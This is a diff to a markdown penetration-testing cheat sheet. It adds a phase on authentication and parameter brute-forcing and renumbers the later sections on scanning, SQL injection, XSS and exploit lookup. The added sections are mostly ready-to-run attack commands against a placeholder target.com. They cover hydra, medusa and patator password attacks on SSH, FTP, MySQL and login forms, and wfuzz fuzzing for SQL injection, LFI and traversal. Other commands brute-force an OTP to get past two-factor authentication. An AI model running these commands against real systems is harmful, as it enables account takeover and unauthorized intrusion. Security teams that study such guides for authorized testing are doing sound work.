@@ -32,23 +32,31 @@ This document provides a simple and detailed explanation of common commands and 
     
     12. [CMS DETECTION & SCANNING](#12-cms-detection--scanning) (CMSeeK, wpscan)
 
-*   **Phase 3: Vulnerability Analysis & Exploitation**
+*   **Phase 3: Authentication & Parameter Brute-Force Testing**
     
-    13. [AUTOMATED VULNERABILITY SCANNING](#13-automated-vulnerability-scanning) (Nuclei, Nikto)
+    13. [AUTHENTICATION BRUTE-FORCE TESTING](#13-authentication-brute-force-testing) (hydra, medusa, patator)
     
-    14. [SQL INJECTION TESTING](#14-sql-injection-testing) (sqlmap)
+    14. [PARAMETER VALUE BRUTE-FORCE & FUZZING](#14-parameter-value-brute-force--fuzzing) (wfuzz, ffuf)
     
-    15. [CROSS-SITE SCRIPTING (XSS) TESTING](#15-cross-site-scripting-xss-testing) (XSStrike, Dalfox)
-    
-    16. [SPECIALIZED VULNERABILITY TESTING](#16-specialized-vulnerability-testing) (Fuxploider, AWSBucketDump, GitDumper)
+    15. [FORM-BASED BRUTE-FORCE TESTING](#15-form-based-brute-force-testing) (burp suite, hydra)
 
-*   **Phase 4: Post-Discovery (Utilities)**
+*   **Phase 4: Vulnerability Analysis & Exploitation**
     
-    17. [FINDING PUBLIC EXPLOITS](#17-finding-public-exploits) (searchsploit)
+    16. [AUTOMATED VULNERABILITY SCANNING](#16-automated-vulnerability-scanning) (Nuclei, Nikto)
+    
+    17. [SQL INJECTION TESTING](#17-sql-injection-testing) (sqlmap)
+    
+    18. [CROSS-SITE SCRIPTING (XSS) TESTING](#18-cross-site-scripting-xss-testing) (XSStrike, Dalfox)
+    
+    19. [SPECIALIZED VULNERABILITY TESTING](#19-specialized-vulnerability-testing) (Fuxploider, AWSBucketDump, GitDumper)
+
+*   **Phase 5: Post-Discovery (Utilities)**
+    
+    20. [FINDING PUBLIC EXPLOITS](#20-finding-public-exploits) (searchsploit)
 
 *   **Appendix: Payloads & Cheatsheets**
     
-    18. [COMMON XSS PAYLOADS](#18-common-xss-payloads)
+    21. [COMMON XSS PAYLOADS](#21-common-xss-payloads)
 
 ---
 
@@ -249,11 +257,141 @@ This phase involves direct interaction with the targets you discovered to map th
 
 ---
 
-### **Phase 3: Vulnerability Analysis & Exploitation**
+### **Phase 3: Authentication & Parameter Brute-Force Testing**
+
+This phase involves testing discovered authentication mechanisms and parameters for weak credentials and exploitable values.
+
+#### 13. AUTHENTICATION BRUTE-FORCE TESTING
+
+*   **Technique Type:** Active Authentication Testing
+*   **Description:** Systematically test login forms, SSH services, and authentication endpoints with common credentials and password lists to identify weak authentication mechanisms.
+*   **Tools:** hydra, medusa, patator, crackmapexec
+*   **The Commands:**
+    ```bash
+    # SSH brute-force attack
+    hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
+
+    # Web form brute-force (login page)
+    hydra -l admin -P /usr/share/wordlists/common-passwords.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
+
+    # HTTP Basic Auth brute-force
+    hydra -l admin -P /usr/share/wordlists/common-passwords.txt target.com http-get /admin/
+
+    # Multiple usernames with password list
+    hydra -L /usr/share/wordlists/common-usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://target.com
+
+    # Alternative tool: medusa
+    medusa -h target.com -u admin -P /usr/share/wordlists/common-passwords.txt -M ssh
+
+    # FTP brute-force
+    hydra -l ftp -P /usr/share/wordlists/common-passwords.txt ftp://target.com
+    ```
+*   **Advanced Techniques:**
+    ```bash
+    # Custom wordlist generation
+    cewl -d 2 -m 5 https://target.com > custom-wordlist.txt
+
+    # Brute-force with custom user agents and delays
+    hydra -l admin -P passwords.txt -t 4 -w 30 -f target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
+
+    # Username enumeration before brute-force
+    ./userenum.py -U /usr/share/wordlists/usernames.txt target.com
+
+    # Database brute-force (MySQL)
+    hydra -l root -P /usr/share/wordlists/common-passwords.txt mysql://target.com:3306
+    ```
+*   **Why It's Useful:** Many systems still use default or weak credentials. Brute-force attacks can reveal authentication bypasses, especially when combined with discovered usernames from reconnaissance phases.
+*   **WARNING:** Brute-force attacks are very noisy and may trigger account lockouts or IP bans. Always use appropriate delays and respect rate limits during authorized testing.
+
+#### 14. PARAMETER VALUE BRUTE-FORCE & FUZZING
+
+*   **Technique Type:** Active Parameter Testing
+*   **Description:** Test discovered parameters with various values to find hidden functionality, injection vulnerabilities, and logic bypasses.
+*   **Tools:** wfuzz, ffuf, burp intruder, parameth
+*   **The Commands:**
+    ```bash
+    # Basic parameter fuzzing with wfuzz
+    wfuzz -c -z file,/usr/share/wordlists/common-params.txt --hc 404 "https://target.com/page.php?FUZZ=test"
+
+    # Parameter value fuzzing for discovered parameters
+    wfuzz -c -z file,/usr/share/wordlists/Fuzzing/special-chars.txt "https://target.com/api/loader.php?f=FUZZ"
+
+    # Multiple parameter fuzzing
+    wfuzz -c -z file,userlist.txt -z file,passlist.txt --hc 404 "https://target.com/login.php?user=FUZZ&pass=FUZ2Z"
+
+    # Using ffuf for parameter discovery and fuzzing
+    ffuf -w /usr/share/wordlists/common-params.txt -u "https://target.com/page.php?FUZZ=test" -fc 404
+
+    # POST parameter fuzzing
+    wfuzz -c -z file,payloads.txt -d "param=FUZZ" "https://target.com/api/endpoint"
+
+    # Header fuzzing
+    wfuzz -c -z file,headers.txt -H "FUZZ: test" "https://target.com/"
+    ```
+*   **Specialized Parameter Testing:**
+    ```bash
+    # SQL injection parameter testing
+    wfuzz -c -z file,/usr/share/wordlists/Fuzzing/SQLi.txt "https://target.com/search.php?q=FUZZ"
+
+    # XSS parameter testing
+    wfuzz -c -z file,/usr/share/wordlists/Fuzzing/XSS.txt "https://target.com/comment.php?msg=FUZZ"
+
+    # Local File Inclusion (LFI) testing
+    wfuzz -c -z file,/usr/share/wordlists/Fuzzing/LFI.txt "https://target.com/include.php?file=FUZZ"
+
+    # Directory traversal testing
+    wfuzz -c -z file,/usr/share/wordlists/Fuzzing/directory-traversal.txt "https://target.com/download.php?path=FUZZ"
+
+    # Business logic value testing
+    wfuzz -c -z range,1-1000 "https://target.com/api/user.php?id=FUZZ"
+
+    # Boolean parameter testing
+    wfuzz -c -z list,true-false-1-0-yes-no "https://target.com/api/admin.php?debug=FUZZ"
+    ```
+*   **Why It's Useful:** Parameter fuzzing can reveal hidden functionality, bypass authentication, discover injection points, and uncover business logic flaws. It's especially powerful when combined with discovered parameters from Phase 2.
+
+#### 15. FORM-BASED BRUTE-FORCE TESTING
+
+*   **Technique Type:** Web Application Brute-Force
+*   **Description:** Specialized testing for web application forms including login pages, password reset forms, and user registration.
+*   **Tools:** burp suite, hydra, patator, authbrute
+*   **The Workflow:**
+    ```bash
+    # Step 1: Identify form structure and anti-CSRF tokens
+    curl -c cookies.txt -b cookies.txt "https://target.com/login" | grep -i csrf
+
+    # Step 2: Automated form-based brute-force
+    hydra -l admin -P /usr/share/wordlists/common-passwords.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^&csrf_token=^C^:S=dashboard:C=/login:F=Invalid"
+
+    # Step 3: Multi-step authentication testing
+    patator http_fuzz url="https://target.com/login" method=POST body="user=admin&pass=FILE0" 0=/usr/share/wordlists/passwords.txt -x ignore:fgrep="Invalid credentials"
+
+    # Step 4: Session-based brute-force (maintaining sessions)
+    hydra -l admin -P passwords.txt -f -V target.com http-post-form "/login:user=^USER^&pass=^PASS^:S=success:C=/login"
+    ```
+*   **Advanced Form Testing:**
+    ```bash
+    # Password reset brute-force
+    wfuzz -c -z file,emails.txt -d "email=FUZZ" "https://target.com/reset-password" --hc 404
+
+    # Registration form enumeration
+    wfuzz -c -z file,usernames.txt -d "username=FUZZ&email=test@test.com&password=test123" "https://target.com/register" -c
+
+    # Two-factor authentication bypass
+    wfuzz -c -z range,000000-999999 -d "otp=FUZZ&username=admin" "https://target.com/verify-otp"
+
+    # Captcha bypass testing
+    wfuzz -c -z file,common-answers.txt -d "captcha=FUZZ&user=admin&pass=password" "https://target.com/login"
+    ```
+*   **Why It's Useful:** Form-based attacks can bypass client-side restrictions, test for account enumeration, and identify weak authentication flows. Modern web applications often have complex authentication mechanisms that require specialized testing.
+
+---
+
+### **Phase 4: Vulnerability Analysis & Exploitation**
 
 This phase involves actively testing for specific flaws and attempting to exploit them.
 
-#### 13. AUTOMATED VULNERABILITY SCANNING
+#### 16. AUTOMATED VULNERABILITY SCANNING
 
 *   **Technique Type:** Vulnerability Analysis (Active)
 *   **Tools:** Nuclei, Nikto
@@ -267,7 +405,7 @@ This phase involves actively testing for specific flaws and attempting to exploi
     ```
 *   **Why It's Useful:** `Nuclei` is the modern tool for quickly checking many hosts for thousands of known issues using community-based templates. `Nikto` is an older, very noisy tool that is excellent for an in-depth analysis on a single server to find dangerous files and outdated software.
 
-#### 14. SQL INJECTION TESTING
+#### 17. SQL INJECTION TESTING
 
 *   **Technique Type:** Vulnerability Analysis (Active)
 *   **Description:** `sqlmap` is the definitive tool for automatically finding and exploiting SQL injection flaws.
@@ -281,7 +419,7 @@ This phase involves actively testing for specific flaws and attempting to exploi
     sqlmap -u https://target.com --forms --crawl=2 --batch
     ```
 
-#### 15. CROSS-SITE SCRIPTING (XSS) TESTING
+#### 18. CROSS-SITE SCRIPTING (XSS) TESTING
 
 *   **Technique Type:** Vulnerability Analysis (Active)
 *   **Description:** These tools automate the hunt for XSS vulnerabilities.
@@ -296,7 +434,7 @@ This phase involves actively testing for specific flaws and attempting to exploi
     ```
 *   **Why It's Useful:** This workflow is highly efficient. You use one tool to find hundreds of potential entry points (`paramspider`) and then pipe that list directly into a specialized scanner (`Dalfox`) to automatically test all of them.
 
-#### 16. SPECIALIZED VULNERABILITY TESTING
+#### 19. SPECIALIZED VULNERABILITY TESTING
 
 *   **Technique Type:** Vulnerability Analysis (Active)
 *   **Description:** These tools are purpose-built for high-impact vulnerability types.
@@ -306,11 +444,11 @@ This phase involves actively testing for specific flaws and attempting to exploi
 
 ---
 
-### **Phase 4: Post-Discovery (Utilities)**
+### **Phase 5: Post-Discovery (Utilities)**
 
 What to do after you find a piece of software or a potential vulnerability.
 
-#### 17. FINDING PUBLIC EXPLOITS
+#### 20. FINDING PUBLIC EXPLOITS
 
 *   **Technique Type:** Post-Discovery Intelligence Gathering
 *   **Description:** Professional exploit research combines automated tools (searchsploit), online databases, and manual CVE analysis to identify weaponizable vulnerabilities. This phase transforms discovered service versions into actionable attack vectors.
@@ -602,7 +740,7 @@ msf6 > exploit  # Execute (ONLY in authorized testing)
 
 ### **Appendix: Payloads & Cheatsheets**
 
-#### 18. COMMON XSS PAYLOADS
+#### 21. COMMON XSS PAYLOADS
 
 *   **Technique Type:** Payload / Cheatsheet
 *   **Description:** An XSS (Cross-Site Scripting) payload is a piece of code, usually JavaScript, that you inject into a website's input field or URL parameter to see if it will execute in a user's browser.
